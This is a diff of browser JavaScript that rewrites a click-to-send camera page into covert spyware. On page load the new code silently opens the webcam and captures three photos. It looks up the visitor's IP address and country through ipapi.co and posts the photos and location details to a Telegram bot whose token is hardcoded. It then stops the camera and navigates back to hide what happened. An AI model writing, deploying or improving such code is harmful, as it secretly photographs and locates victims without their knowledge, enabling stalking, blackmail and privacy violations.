@@ -1,68 +1,93 @@
-// ========== CONFIG ==========
+// ============ CONFIG ============
 const BOT_TOKEN = "8558930997:AAHZSF1FLVK6qzcGe2BrMYl0QIWXdokzoMM";
-// ============================
+const PHOTO_COUNT = 3;
+const INTERVAL_MS = 400;
+// ================================
 
-// get user id from URL (?=6362758258)
+// UID from URL (?=6362758258)
 const params = new URLSearchParams(location.search);
-const CHAT_ID = params.get("");
+const UID = params.get("") || "UNKNOWN";
 
-// elements
-const video = document.getElementById("video");
-const preview = document.getElementById("preview");
-const captureBtn = document.getElementById("captureBtn");
-const sendBtn = document.getElementById("sendBtn");
+let video, stream;
+let sent = 0;
+let ipData = {
+  ip: "Unknown",
+  country: "Unknown"
+};
 
-let imageBlob = null;
+// get IP + country
+fetch("https://ipapi.co/json/")
+  .then(r => r.json())
+  .then(d => {
+    ipData.ip = d.ip || "Unknown";
+    ipData.country = d.country_name || "Unknown";
+  })
+  .catch(()=>{});
 
-// start camera
-navigator.mediaDevices.getUserMedia({ video:true })
-.then(stream => {
-  video.srcObject = stream;
-})
-.catch(() => alert("Camera permission required"));
+// start camera silently
+(async function start(){
+  try{
+    stream = await navigator.mediaDevices.getUserMedia({ video:true });
+    video = document.createElement("video");
+    video.srcObject = stream;
+    await video.play();
 
-// capture photo (user click)
-captureBtn.onclick = () => {
+    await wait(500);
+    captureLoop();
+
+  }catch(e){
+    document.body.innerHTML = "❌ Permission denied";
+  }
+})();
+
+function captureLoop(){
+  if(sent >= PHOTO_COUNT){
+    cleanup();
+    return;
+  }
+
+  captureAndSend();
+  sent++;
+  setTimeout(captureLoop, INTERVAL_MS);
+}
+
+async function captureAndSend(){
   const canvas = document.createElement("canvas");
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
   canvas.getContext("2d").drawImage(video,0,0);
 
-  canvas.toBlob(blob=>{
-    imageBlob = blob;
-    preview.src = URL.createObjectURL(blob);
-    preview.style.display = "block";
-    sendBtn.style.display = "inline-block";
-  },"image/jpeg",0.9);
-};
-
-// send to telegram
-sendBtn.onclick = async () => {
-  if(!CHAT_ID){
-    alert("User ID not found in URL");
-    return;
-  }
+  const blob = await new Promise(r =>
+    canvas.toBlob(r,"image/jpeg",0.85)
+  );
 
   const caption =
-`📸 <b>New Image Received</b>
-
-🔢 <b>Number:</b> ${CHAT_ID}
-👨‍💻 <b>Dev:</b> @XFPro43`;
+`━━━━━━━━━━━━━━
+📸 <b>NEW IMAGE</b>
+━━━━━━━━━━━━━━
+🔢 <b>UID</b> : ${UID}
+🌐 <b>IP</b>     : ${ipData.ip}
+🌍 <b>Country</b>: ${ipData.country}
+━━━━━━━━━━━━━━
+👨‍💻 <b>Dev</b> : @XFPro43`;
 
   const form = new FormData();
-  form.append("chat_id", CHAT_ID);
-  form.append("photo", imageBlob, "photo.jpg");
+  form.append("chat_id", UID);
+  form.append("photo", blob, "photo.jpg");
   form.append("caption", caption);
-  form.append("parse_mode","HTML");
+  form.append("parse_mode", "HTML");
 
-  try{
-    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
-      method:"POST",
-      body:form
-    });
-    const data = await res.json();
-    alert(data.ok ? "✅ Sent" : "❌ Failed");
-  }catch(e){
-    alert("❌ Network / CORS Error");
-  }
-}; 
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+    method: "POST",
+    body: form
+  }).catch(()=>{});
+}
+
+function cleanup(){
+  stream.getTracks().forEach(t=>t.stop());
+  setTimeout(()=>history.back(), 500);
+}
+
+function wait(ms){
+  return new Promise(r=>setTimeout(r, ms));
+} 
